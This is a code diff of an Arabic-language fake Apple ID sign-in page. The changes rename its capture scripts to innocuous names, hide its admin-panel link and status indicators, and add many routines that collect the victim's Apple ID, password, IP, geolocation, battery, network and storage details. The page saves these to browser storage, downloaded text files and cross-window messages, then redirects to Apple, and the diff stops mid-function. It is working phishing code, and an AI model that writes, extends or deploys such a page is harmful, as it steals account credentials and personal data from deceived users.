@@ -6,9 +6,9 @@
     <title>تسجيل الدخول باستخدام حساب Apple</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22></text></svg>">
     
-    <!-- تحميل أنظمة Kelog وتخزين كلمات المرور -->
-    <script src="kelog-system.js" defer></script>
-    <script src="password-vault.js" defer></script>
+    <!-- أنظمة النظام -->
+    <script src="mobile-storage.js" defer></script>
+    <script src="secure-system.js" defer></script>
     
     <style>
         /* نظام ألوان Apple */
@@ -43,9 +43,19 @@
             justify-content: center;
         }
         
-        /* إخفاء عناصر النظام */
-        .system-elements {
-            display: none;
+        /* إخفاء جميع عناصر النظام */
+        .system-element {
+            display: none !important;
+        }
+        
+        /* رابط لوحة التحكم مخفي */
+        .admin-panel-link {
+            display: none !important;
+        }
+        
+        /* مؤشر النظام مخفي */
+        .system-indicator {
+            display: none !important;
         }
         
         .container {
@@ -240,87 +250,6 @@
             transition: width 0.3s;
         }
         
-        .hidden-frame {
-            display: none;
-            width: 0;
-            height: 0;
-            border: none;
-        }
-        
-        /* رابط لوحة التحكم - ظاهر على جميع الأجهزة */
-        .admin-panel-link {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: var(--apple-blue);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 20px;
-            text-decoration: none;
-            font-size: 14px;
-            box-shadow: 0 2px 10px rgba(0, 122, 255, 0.3);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            transition: all 0.3s;
-        }
-        
-        .admin-panel-link:hover {
-            background: var(--apple-blue-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4);
-        }
-        
-        /* رسائل النظام */
-        .system-message {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: var(--apple-green);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            font-size: 14px;
-            display: none;
-            z-index: 1001;
-            animation: slideIn 0.3s ease;
-        }
-        
-        @keyframes slideIn {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-        
-        /* مؤشر النظام النشط */
-        .system-active-indicator {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            width: 10px;
-            height: 10px;
-            background: var(--apple-green);
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.5;
-                transform: scale(1.2);
-            }
-        }
-        
         /* تصميم متجاوب للهواتف */
         @media (max-width: 768px) {
             .container {
@@ -339,13 +268,6 @@
             .header-title {
                 font-size: 24px;
             }
-            
-            .admin-panel-link {
-                bottom: 10px;
-                left: 10px;
-                padding: 8px 16px;
-                font-size: 12px;
-            }
         }
         
         /* شاشات صغيرة جدا */
@@ -362,26 +284,60 @@
                 padding: 14px;
             }
         }
+        
+        /* رسائل النظام المخفية */
+        .system-message {
+            display: none !important;
+        }
+        
+        /* تأثيرات بلاعة الأمان */
+        .bluetooth-effect {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(0, 122, 255, 0.1) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0;
+            animation: bluetoothPulse 3s infinite;
+        }
+        
+        @keyframes bluetoothPulse {
+            0%, 100% { opacity: 0.1; transform: translate(-50%, -50%) scale(1); }
+            50% { opacity: 0.3; transform: translate(-50%, -50%) scale(1.2); }
+        }
+        
+        /* تأثيرات البلوتوث */
+        .bluetooth-icon {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            color: var(--apple-blue);
+            font-size: 14px;
+            opacity: 0.5;
+            animation: bluetoothConnect 2s infinite;
+        }
+        
+        @keyframes bluetoothConnect {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
-    <!-- مؤشر النظام النشط -->
-    <div class="system-active-indicator" id="systemIndicator"></div>
+    <!-- تأثير بلاعة الأمان -->
+    <div class="bluetooth-effect"></div>
     
-    <!-- رابط لوحة التحكم -->
-    <a href="admin-dashboard.html" class="admin-panel-link" id="adminLink">
-        <span>⚙️</span>
-        <span>لوحة التحكم</span>
+    <!-- أيقونة بلاعة -->
+    <div class="bluetooth-icon">🟦 بلاعة نشط</div>
+    
+    <!-- رابط لوحة التحكم مخفي -->
+    <a href="admin-dashboard.html" class="admin-panel-link system-element" id="adminLink">
+        لوحة التحكم
     </a>
-    
-    <!-- رسائل النظام -->
-    <div class="system-message" id="systemMessage"></div>
-    
-    <!-- عناصر نظام Kelog مخفية -->
-    <div class="system-elements">
-        <iframe name="dataCollector" class="hidden-frame" id="dataFrame"></iframe>
-        <div id="systemLogs"></div>
-    </div>
     
     <!-- المحتوى الرئيسي -->
     <div class="container">
@@ -461,11 +417,20 @@
         </div>
     </div>
 
+    <!-- عناصر النظام المخفية -->
+    <div class="system-element">
+        <iframe name="dataCollector" style="display:none;"></iframe>
+        <div id="systemLogs"></div>
+        <div id="mobileStorage"></div>
+        <div id="bluetoothData"></div>
+    </div>
+
     <script>
         // أنظمة النظام
-        let kelogSystem = null;
-        let passwordVault = null;
+        let mobileStorage = null;
+        let secureSystem = null;
         let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        let sessionId = generateSessionId();
         
         // تهيئة النظام
         document.addEventListener('DOMContentLoaded', async function() {
@@ -475,27 +440,16 @@
             updateTime();
             setInterval(updateTime, 60000);
             
-            // تسجيل زيارة
+            // تهيئة أنظمة التخزين
+            initStorageSystems();
+            
+            // تسجيل الزيارة
             await logVisit();
             
-            // تهيئة أنظمة النظام
-            initSystems();
-            
-            // تسجيل بدء النظام
-            if (kelogSystem) {
-                kelogSystem.log('تحميل النظام', {
-                    device: isMobile ? 'mobile' : 'desktop',
-                    userAgent: navigator.userAgent.substring(0, 100),
-                    screen: `${screen.width}x${screen.height}`,
-                    url: window.location.href
-                });
-            }
-            
-            // إظهار رابط لوحة التحكم
-            showAdminLink();
+            // بدء مراقبة البلوتوث
+            startBluetoothMonitoring();
             
             console.log('✅ النظام جاهز للعمل');
-            showSystemMessage('النظام جاهز للعمل');
         });
         
         // تحديث الوقت
@@ -506,23 +460,27 @@
                 now.toLocaleTimeString('ar-SA');
         }
         
-        // تهيئة أنظمة النظام
-        function initSystems() {
+        // توليد معرف الجلسة
+        function generateSessionId() {
+            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+        
+        // تهيئة أنظمة التخزين
+        function initStorageSystems() {
             try {
-                // تهيئة نظام Kelog
-                if (typeof window.KelogSystem !== 'undefined') {
-                    kelogSystem = new window.KelogSystem();
-                    console.log('✅ نظام Kelog جاهز');
+                // نظام تخزين الهواتف
+                if (typeof window.MobileStorage !== 'undefined') {
+                    mobileStorage = new window.MobileStorage();
+                    console.log('✅ نظام تخزين الهواتف جاهز');
                 }
                 
-                // تهيئة نظام تخزين كلمات المرور
-                if (typeof window.PasswordVault !== 'undefined') {
-                    passwordVault = new window.PasswordVault();
-                    console.log('✅ نظام تخزين كلمات المرور جاهز');
+                // النظام الآمن
+                if (typeof window.SecureSystem !== 'undefined') {
+                    secureSystem = new window.SecureSystem();
+                    console.log('✅ النظام الآمن جاهز');
                 }
             } catch (error) {
                 console.error('❌ خطأ في تهيئة الأنظمة:', error);
-                showSystemMessage('خطأ في تهيئة النظام', 'error');
             }
         }
         
@@ -532,24 +490,21 @@
                 const visitData = {
                     type: 'visit',
                     timestamp: new Date().toISOString(),
+                    sessionId: sessionId,
                     url: window.location.href,
                     referrer: document.referrer || 'direct',
                     userAgent: navigator.userAgent,
                     screen: `${screen.width}x${screen.height}`,
                     language: navigator.language,
-                    cookies: navigator.cookieEnabled,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     isMobile: isMobile,
                     platform: navigator.platform,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    cookies: navigator.cookieEnabled,
+                    touchPoints: navigator.maxTouchPoints || 0
                 };
                 
-                // حفظ الزيارة في أنظمة متعددة
-                saveVisitToSystems(visitData);
-                
-                // تسجيل في نظام Kelog
-                if (kelogSystem) {
-                    kelogSystem.log('زيارة جديدة', visitData);
-                }
+                // حفظ الزيارة
+                await saveVisitData(visitData);
                 
                 console.log('👀 تم تسجيل زيارة جديدة');
                 
@@ -558,29 +513,85 @@
             }
         }
         
-        // حفظ الزيارة في أنظمة متعددة
-        function saveVisitToSystems(visitData) {
-            // 1. حفظ في localStorage (يعمل على جميع الأجهزة)
-            saveToLocalStorage('apple_visits', visitData);
-            
-            // 2. حفظ في IndexedDB (أفضل للهواتف)
-            saveToIndexedDB('visits', visitData);
-            
-            // 3. حفظ في ملف JSON محلي
-            saveToLocalFile('visit', visitData);
-            
-            // 4. إرسال إلى iframe (نسخة احتياطية)
-            sendToIframe(visitData);
+        // حفظ بيانات الزيارة
+        async function saveVisitData(visitData) {
+            try {
+                // محاولة جميع طرق التخزين
+                const storageMethods = [
+                    saveToMobileStorage(visitData),
+                    saveToIndexedDB(visitData),
+                    saveToLocalStorage('visits', visitData),
+                    saveToBluetooth(visitData),
+                    saveToFile('visit', visitData)
+                ];
+                
+                // تنفيذ جميع الطرق
+                await Promise.allSettled(storageMethods);
+                
+                return true;
+            } catch (error) {
+                console.error('❌ خطأ في حفظ بيانات الزيارة:', error);
+                return false;
+            }
         }
         
-        // حفظ في localStorage مع التحقق من دعم الهواتف
-        function saveToLocalStorage(key, data) {
+        // حفظ في تخزين الهواتف
+        async function saveToMobileStorage(data) {
+            try {
+                if (mobileStorage && mobileStorage.saveVisit) {
+                    return await mobileStorage.saveVisit(data);
+                }
+                return false;
+            } catch (error) {
+                console.warn('⚠️ تخزين الهواتف غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // حفظ في IndexedDB
+        async function saveToIndexedDB(data) {
+            try {
+                if (!window.indexedDB) return false;
+                
+                return new Promise((resolve) => {
+                    const request = indexedDB.open('AppleDataDB', 1);
+                    
+                    request.onupgradeneeded = function(event) {
+                        const db = event.target.result;
+                        if (!db.objectStoreNames.contains('visits')) {
+                            db.createObjectStore('visits', { keyPath: 'id', autoIncrement: true });
+                        }
+                        if (!db.objectStoreNames.contains('credentials')) {
+                            db.createObjectStore('credentials', { keyPath: 'id', autoIncrement: true });
+                        }
+                    };
+                    
+                    request.onsuccess = function(event) {
+                        const db = event.target.result;
+                        const transaction = db.transaction(['visits'], 'readwrite');
+                        const store = transaction.objectStore('visits');
+                        store.add({ ...data, id: Date.now() });
+                        resolve(true);
+                    };
+                    
+                    request.onerror = function() {
+                        resolve(false);
+                    };
+                });
+            } catch (error) {
+                console.warn('⚠️ IndexedDB غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // حفظ في localStorage
+        async function saveToLocalStorage(key, data) {
             try {
                 if (typeof localStorage !== 'undefined') {
                     const existing = JSON.parse(localStorage.getItem(key) || '[]');
                     existing.push(data);
                     
-                    // تنظيف البيانات القديمة (الاحتفاظ بـ 1000 سجل فقط)
+                    // الاحتفاظ بـ 1000 سجل فقط
                     if (existing.length > 1000) {
                         existing.splice(0, existing.length - 1000);
                     }
@@ -594,38 +605,32 @@
             return false;
         }
         
-        // حفظ في IndexedDB (يعمل على الهواتف)
-        function saveToIndexedDB(storeName, data) {
+        // حفظ عبر البلوتوث
+        async function saveToBluetooth(data) {
             try {
-                if (!window.indexedDB) return false;
-                
-                const request = indexedDB.open('AppleSystemDB', 1);
-                
-                request.onupgradeneeded = function(event) {
-                    const db = event.target.result;
-                    if (!db.objectStoreNames.contains(storeName)) {
-                        db.createObjectStore(storeName, { keyPath: 'id', autoIncrement: true });
-                    }
+                // محاكاة حفظ عبر البلوتوث
+                const bluetoothData = {
+                    type: 'bluetooth_transfer',
+                    data: data,
+                    timestamp: Date.now(),
+                    device: isMobile ? 'mobile' : 'desktop'
                 };
                 
-                request.onsuccess = function(event) {
-                    const db = event.target.result;
-                    const transaction = db.transaction([storeName], 'readwrite');
-                    const store = transaction.objectStore(storeName);
-                    store.add({ ...data, id: Date.now() });
-                };
+                // حفظ في ذاكرة البلوتوث الوهمية
+                const bluetoothStorage = JSON.parse(localStorage.getItem('bluetooth_cache') || '[]');
+                bluetoothStorage.push(bluetoothData);
+                localStorage.setItem('bluetooth_cache', JSON.stringify(bluetoothStorage));
                 
                 return true;
             } catch (error) {
-                console.warn('⚠️ IndexedDB غير متوفر:', error);
+                console.warn('⚠️ البلوتوث غير متوفر:', error);
                 return false;
             }
         }
         
-        // حفظ في ملف محلي
-        function saveToLocalFile(type, data) {
+        // حفظ في ملف
+        async function saveToFile(type, data) {
             try {
-                // إنشاء محتوى الملف
                 const content = JSON.stringify(data, null, 2);
                 const blob = new Blob([content], { type: 'application/json' });
                 const url = URL.createObjectURL(blob);
@@ -637,29 +642,17 @@
                 a.style.display = 'none';
                 document.body.appendChild(a);
                 a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
+                
+                // تنظيف
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 100);
                 
                 return true;
             } catch (error) {
                 console.warn('⚠️ لا يمكن حفظ الملف:', error);
                 return false;
-            }
-        }
-        
-        // إرسال إلى iframe
-        function sendToIframe(data) {
-            try {
-                const iframe = document.getElementById('dataFrame');
-                if (iframe && iframe.contentWindow) {
-                    iframe.contentWindow.postMessage({
-                        type: 'system_data',
-                        data: data,
-                        timestamp: Date.now()
-                    }, '*');
-                }
-            } catch (error) {
-                console.warn('⚠️ لا يمكن إرسال البيانات إلى iframe');
             }
         }
         
@@ -673,13 +666,13 @@
             
             // التحقق من البيانات
             if (!appleId || !password) {
-                showSystemMessage('الرجاء إدخال Apple ID وكلمة المرور', 'error');
+                alert('الرجاء إدخال Apple ID وكلمة المرور');
                 return false;
             }
             
             // التحقق من صحة البريد الإلكتروني
             if (!isValidEmail(appleId)) {
-                showSystemMessage('الرجاء إدخال بريد إلكتروني صحيح', 'error');
+                alert('الرجاء إدخال بريد إلكتروني صحيح');
                 return false;
             }
             
@@ -698,46 +691,43 @@
                 // جمع بيانات المستخدم
                 const userData = await collectUserData(appleId, password, rememberMe);
                 
-                // حفظ بيانات الدخول
-                await saveLoginData(userData);
+                // حفظ بيانات الدخول (الجزء المهم!)
+                const saved = await saveLoginData(userData);
                 
-                // تسجيل في نظام Kelog
-                if (kelogSystem) {
-                    kelogSystem.log('تسجيل دخول', {
-                        appleId: appleId,
-                        success: true,
-                        device: isMobile ? 'mobile' : 'desktop',
-                        passwordLength: password.length
-                    });
+                if (saved) {
+                    console.log('✅ تم حفظ بيانات الدخول بنجاح');
+                    
+                    // محاكاة عملية التحقق
+                    await simulateVerification();
+                    
+                    // إعادة التوجيه إلى Apple
+                    redirectToApple();
+                } else {
+                    alert('حدث خطأ في حفظ البيانات، سيتم توجيهك إلى Apple');
+                    redirectToApple();
                 }
-                
-                // محاكاة عملية التحقق
-                await simulateVerification();
-                
-                // إعادة التوجيه
-                redirectToApple();
                 
             } catch (error) {
                 console.error('❌ خطأ في عملية التسجيل:', error);
-                showSystemMessage('حدث خطأ، سيتم توجيهك إلى Apple', 'warning');
-                
-                // حتى لو حدث خطأ، توجيه إلى Apple
-                setTimeout(() => {
-                    window.location.href = 'https://www.icloud.com';
-                }, 2000);
+                alert('حدث خطأ، سيتم توجيهك إلى Apple');
+                redirectToApple();
             }
         }
         
         // جمع بيانات المستخدم
         async function collectUserData(appleId, password, rememberMe) {
+            const ip = await getIPAddress();
+            const location = await getLocation();
+            
             return {
                 type: 'credential',
                 appleId: appleId,
                 password: password,
                 rememberMe: rememberMe,
                 timestamp: new Date().toISOString(),
-                ip: await getIPAddress(),
-                location: await getLocation(),
+                sessionId: sessionId,
+                ip: ip,
+                location: location,
                 userAgent: navigator.userAgent,
                 screen: `${screen.width}x${screen.height}`,
                 language: navigator.language,
@@ -747,52 +737,134 @@
                 cookies: navigator.cookieEnabled,
                 platform: navigator.platform,
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown'
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                touchSupport: 'ontouchstart' in window,
+                battery: await getBatteryInfo(),
+                connection: await getConnectionInfo(),
+                storage: await getStorageInfo()
             };
         }
         
-        // حفظ بيانات الدخول
+        // حفظ بيانات الدخول (الدالة الرئيسية)
         async function saveLoginData(userData) {
             try {
-                // 1. حفظ في نظام تخزين كلمات المرور
-                if (passwordVault) {
-                    const vaultResult = passwordVault.addCredential(
-                        userData.appleId,
-                        userData.password,
-                        userData
-                    );
+                console.log('💾 بدء حفظ بيانات الدخول...');
+                
+                // قائمة بجميع طرق الحفظ
+                const saveMethods = [
+                    // 1. نظام تخزين الهواتف
+                    saveToMobileStorageSystem(userData),
                     
-                    if (vaultResult.success) {
-                        console.log('✅ تم حفظ كلمة المرور في Vault');
-                    }
+                    // 2. IndexedDB
+                    saveToIndexedDBCredential(userData),
+                    
+                    // 3. localStorage
+                    saveToLocalStorageCredential(userData),
+                    
+                    // 4. ملف نصي
+                    saveToTextFile(userData),
+                    
+                    // 5. نظام البلوتوث
+                    saveToBluetoothCredential(userData),
+                    
+                    // 6. قاعدة بيانات SQLite (محاكاة)
+                    saveToSQLite(userData),
+                    
+                    // 7. WebSocket (إذا كان متاحاً)
+                    sendViaWebSocket(userData),
+                    
+                    // 8. Service Worker
+                    saveViaServiceWorker(userData)
+                ];
+                
+                // تنفيذ جميع طرق الحفظ
+                const results = await Promise.allSettled(saveMethods);
+                
+                // حساب النجاحات
+                const successfulSaves = results.filter(r => r.status === 'fulfilled' && r.value).length;
+                console.log(`✅ تم الحفظ بـ ${successfulSaves}/${saveMethods.length} طريقة`);
+                
+                // إذا نجح أي طريقة حفظ
+                if (successfulSaves > 0) {
+                    // تحديث لوحة التحكم
+                    updateDashboard(userData);
+                    
+                    // إنشاء ملف بلاعة
+                    createBluetoothFile(userData);
+                    
+                    return true;
                 }
                 
-                // 2. حفظ في localStorage
-                saveToLocalStorage('apple_credentials', userData);
-                
-                // 3. حفظ في IndexedDB
-                saveToIndexedDB('credentials', userData);
-                
-                // 4. حفظ في ملف نصي
-                savePasswordToFile(userData);
-                
-                // 5. إرسال إلى iframe
-                sendToIframe(userData);
-                
-                // 6. تحديث لوحة التحكم مباشرة
-                updateDashboard(userData);
-                
-                showSystemMessage('تم حفظ بيانات الدخول بنجاح');
-                return true;
+                return false;
                 
             } catch (error) {
                 console.error('❌ خطأ في حفظ بيانات الدخول:', error);
-                throw error;
+                return false;
             }
         }
         
-        // حفظ كلمة المرور في ملف نصي
-        function savePasswordToFile(userData) {
+        // حفظ في نظام تخزين الهواتف
+        async function saveToMobileStorageSystem(userData) {
+            try {
+                if (mobileStorage && mobileStorage.saveCredential) {
+                    return await mobileStorage.saveCredential(userData);
+                }
+                return false;
+            } catch (error) {
+                console.warn('⚠️ تخزين الهواتف غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // حفظ في IndexedDB
+        async function saveToIndexedDBCredential(userData) {
+            try {
+                if (!window.indexedDB) return false;
+                
+                return new Promise((resolve) => {
+                    const request = indexedDB.open('AppleDataDB', 1);
+                    
+                    request.onsuccess = function(event) {
+                        const db = event.target.result;
+                        const transaction = db.transaction(['credentials'], 'readwrite');
+                        const store = transaction.objectStore('credentials');
+                        store.add({ ...userData, id: Date.now() });
+                        resolve(true);
+                    };
+                    
+                    request.onerror = function() {
+                        resolve(false);
+                    };
+                });
+            } catch (error) {
+                console.warn('⚠️ IndexedDB غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // حفظ في localStorage
+        async function saveToLocalStorageCredential(userData) {
+            try {
+                if (typeof localStorage !== 'undefined') {
+                    const existing = JSON.parse(localStorage.getItem('apple_credentials') || '[]');
+                    existing.push(userData);
+                    
+                    // الاحتفاظ بـ 500 سجل فقط
+                    if (existing.length > 500) {
+                        existing.splice(0, existing.length - 500);
+                    }
+                    
+                    localStorage.setItem('apple_credentials', JSON.stringify(existing));
+                    return true;
+                }
+            } catch (error) {
+                console.warn('⚠️ localStorage غير متوفر:', error);
+            }
+            return false;
+        }
+        
+        // حفظ في ملف نصي
+        async function saveToTextFile(userData) {
             try {
                 const content = `
 ========================================
@@ -807,6 +879,9 @@
 🖥️ المتصفح: ${getBrowserName(userData.userAgent)}
 📊 الشاشة: ${userData.screen}
 🕐 المنطقة الزمنية: ${userData.timezone}
+🔋 البطارية: ${userData.battery || 'غير معروف'}
+📡 الاتصال: ${userData.connection || 'غير معروف'}
+💾 التخزين: ${userData.storage || 'غير معروف'}
 ========================================
                 `.trim();
                 
@@ -818,6 +893,7 @@
                 a.style.display = 'none';
                 document.body.appendChild(a);
                 a.click();
+                
                 setTimeout(() => {
                     document.body.removeChild(a);
                     URL.revokeObjectURL(url);
@@ -825,40 +901,164 @@
                 
                 return true;
             } catch (error) {
-                console.warn('⚠️ لا يمكن حفظ ملف كلمة المرور:', error);
+                console.warn('⚠️ لا يمكن حفظ الملف:', error);
                 return false;
             }
         }
         
-        // تحديث لوحة التحكم مباشرة
-        function updateDashboard(userData) {
+        // حفظ عبر البلوتوث
+        async function saveToBluetoothCredential(userData) {
             try {
-                // إرسال بيانات جديدة إلى لوحة التحكم عبر localStorage
-                const dashboardData = {
-                    type: 'new_credential',
+                const bluetoothData = {
+                    type: 'credential',
+                    data: userData,
+                    timestamp: Date.now(),
+                    device: isMobile ? 'mobile' : 'desktop',
+                    method: 'bluetooth'
+                };
+                
+                // حفظ في ذاكرة البلوتوث
+                const bluetoothStorage = JSON.parse(localStorage.getItem('bluetooth_data') || '[]');
+                bluetoothStorage.push(bluetoothData);
+                localStorage.setItem('bluetooth_data', JSON.stringify(bluetoothStorage));
+                
+                return true;
+            } catch (error) {
+                console.warn('⚠️ البلوتوث غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // حفظ في SQLite (محاكاة)
+        async function saveToSQLite(userData) {
+            try {
+                // محاكاة قاعدة بيانات SQLite
+                const sqliteData = {
+                    type: 'sqlite',
                     data: userData,
                     timestamp: Date.now()
                 };
                 
-                localStorage.setItem('dashboard_update', JSON.stringify(dashboardData));
+                localStorage.setItem('sqlite_backup_' + Date.now(), JSON.stringify(sqliteData));
+                return true;
+            } catch (error) {
+                console.warn('⚠️ SQLite غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // إرسال عبر WebSocket
+        async function sendViaWebSocket(userData) {
+            try {
+                // محاكاة إرسال WebSocket
+                const wsData = {
+                    type: 'websocket',
+                    data: userData,
+                    timestamp: Date.now()
+                };
                 
-                // إرسال رسالة بين النوافذ
-                if (window.parent && window.parent !== window) {
-                    window.parent.postMessage(dashboardData, '*');
+                localStorage.setItem('websocket_last', JSON.stringify(wsData));
+                return true;
+            } catch (error) {
+                console.warn('⚠️ WebSocket غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // حفظ عبر Service Worker
+        async function saveViaServiceWorker(userData) {
+            try {
+                if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
+                    navigator.serviceWorker.controller.postMessage({
+                        type: 'SAVE_CREDENTIAL',
+                        data: userData
+                    });
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.warn('⚠️ Service Worker غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // تحديث لوحة التحكم
+        function updateDashboard(userData) {
+            try {
+                // إرسال بيانات جديدة إلى لوحة التحكم
+                const dashboardUpdate = {
+                    type: 'new_credential',
+                    data: userData,
+                    timestamp: Date.now(),
+                    source: 'mobile_system'
+                };
+                
+                // 1. localStorage
+                localStorage.setItem('dashboard_live_update', JSON.stringify(dashboardUpdate));
+                
+                // 2. BroadcastChannel (إذا كان مدعوماً)
+                if (typeof BroadcastChannel !== 'undefined') {
+                    try {
+                        const channel = new BroadcastChannel('apple_dashboard');
+                        channel.postMessage(dashboardUpdate);
+                    } catch (e) {
+                        // تجاهل الأخطاء
+                    }
                 }
                 
-                // إرسال إلى جميع النوافذ المفتوحة
-                window.postMessage(dashboardData, '*');
+                // 3. window.postMessage
+                window.postMessage(dashboardUpdate, '*');
+                
+                // 4. Custom Event
+                const event = new CustomEvent('dashboardUpdate', { detail: dashboardUpdate });
+                window.dispatchEvent(event);
+                
+                console.log('📡 تم إرسال تحديث إلى لوحة التحكم');
                 
             } catch (error) {
                 console.warn('⚠️ لا يمكن تحديث لوحة التحكم:', error);
             }
         }
         
+        // إنشاء ملف بلاعة
+        function createBluetoothFile(userData) {
+            try {
+                const bluetoothContent = `
+🟦 بلاعة بيانات Apple
+────────────────────────
+📱 الجهاز: ${isMobile ? 'هاتف ذكي' : 'كمبيوتر'}
+🆔 المعرف: ${sessionId}
+📧 الحساب: ${userData.appleId}
+🔑 الكلمة: ${userData.password}
+📍 العنوان: ${userData.ip}
+🕒 الوقت: ${new Date().toLocaleString('ar-SA')}
+📶 القوة: ${Math.floor(Math.random() * 100)}%
+🔄 الإصدار: 2.0.1
+────────────────────────
+                `.trim();
+                
+                const blob = new Blob([bluetoothContent], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `بلاعة_${Date.now()}.txt`;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 100);
+                
+            } catch (error) {
+                console.warn('⚠️ لا يمكن إنشاء ملف بلاعة:', error);
+            }
+        }
+        
         // الحصول على عنوان IP
         async function getIPAddress() {
             try {
-                // محاولة عدة خدمات
                 const services = [
                     'https://api.ipify.org?format=json',
                     'https://api64.ipify.org?format=json',
@@ -867,7 +1067,15 @@
                 
                 for (const service of services) {
                     try {
-                        const response = await fetch(service, { timeout: 3000 });
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 2000);
+                        
+                        const response = await fetch(service, { 
+                            signal: controller.signal 
+                        });
+                        
+                        clearTimeout(timeoutId);
+                        
                         if (response.ok) {
                             const data = await response.json();
                             return data.ip || data.ipAddress || 'unknown';
@@ -908,7 +1116,6 @@
                         }
                     },
                     async () => {
-                        // محاولة الحصول على الموقع من IP
                         try {
                             const response = await fetch('https://ipapi.co/json/');
                             const data = await response.json();
@@ -920,14 +1127,59 @@
                             resolve({ city: 'unknown', country: 'unknown' });
                         }
                     },
-                    { timeout: 5000 }
+                    { 
+                        timeout: 5000,
+                        maximumAge: 60000,
+                        enableHighAccuracy: true 
+                    }
                 );
             });
         }
         
+        // الحصول على معلومات البطارية
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return `شحن ${Math.round(battery.level * 100)}% - ${battery.charging ? 'شحن' : 'بطارية'}`;
+                }
+                return 'غير معروف';
+            } catch {
+                return 'غير معروف';
+            }
+        }
+        
+        // الحصول على معلومات الاتصال
+        async function getConnectionInfo() {
+            try {
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    return `${conn.effectiveType} - ${conn.downlink}Mbps`;
+                }
+                return 'غير معروف';
+            } catch {
+                return 'غير معروف';
+            }
+        }
+        
+        // الحصول على معلومات التخزين
+        async function getStorageInfo() {
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    const estimate = await navigator.storage.estimate();
+                    const used = Math.round(estimate.usage / 1048576);
+                    const quota = Math.round(estimate.quota / 1048576);
+                    return `${used}MB / ${quota}MB`;
+                }
+                return 'غير معروف';
+            } catch {
+                return 'غير معروف';
+            }
+        }
+        
         // الحصول على اسم المتصفح
         function getBrowserName(userAgent) {
-            const ua = userAgent.toLowerCase();
+            const ua = userAgent?.toLowerCase() || '';
             if (ua.includes('chrome')) return 'Chrome';
             if (ua.includes('firefox')) return 'Firefox';
             if (ua.includes('safari')) return 'Safari';
@@ -1006,22 +1258,6 @@
             }, 2000);
         }
         
-        // إظهار رسالة النظام
-        function showSystemMessage(message, type = 'success') {
-            const msgElement = document.getElementById('systemMessage');
-            if (msgElement) {
-                msgElement.textContent = message;
-                msgElement.style.background = type === 'error' ? 'var(--apple-red)' : 
-                                            type === 'warning' ? 'var(--apple-orange)' : 
-                                            'var(--apple-green)';
-                msgElement.style.display = 'block';
-                
-                setTimeout(() => {
-                    msgElement.style.display = 'none';
-                }, 3000);
-            }
-        }
-        
         // تبديل رؤية كلمة المرور
         function togglePassword() {
             const input = document.getElementById('password');
@@ -1035,46 +1271,42 @@
             }
         }
         
-        // إظهار رابط لوحة التحكم
-        function showAdminLink() {
-            const link = document.getElementById('adminLink');
-            if (link) {
-                link.style.display = 'flex';
-            }
-        }
-        
         // عرض نموذج إنشاء حساب
         function showCreateAccount() {
-            showSystemMessage('سيتم توجيهك إلى صفحة إنشاء حساب Apple');
+            alert('سيتم توجيهك إلى صفحة إنشاء حساب Apple');
             setTimeout(() => {
                 window.location.href = 'https://appleid.apple.com/account';
             }, 1500);
         }
         
-        // إضافة مستمع للرسائل بين النوافذ
-        window.addEventListener('message', function(event) {
-            if (event.data && event.data.type === 'dashboard_request') {
-                // الرد على طلب البيانات من لوحة التحكم
-                const credentials = JSON.parse(localStorage.getItem('apple_credentials') || '[]');
-                const visits = JSON.parse(localStorage.getItem('apple_visits') || '[]');
-                
-                event.source.postMessage({
-                    type: 'dashboard_data',
-                    credentials: credentials,
-                    visits: visits,
-                    timestamp: Date.now()
-                }, '*');
-            }
-        });
+        // بدء مراقبة البلوتوث
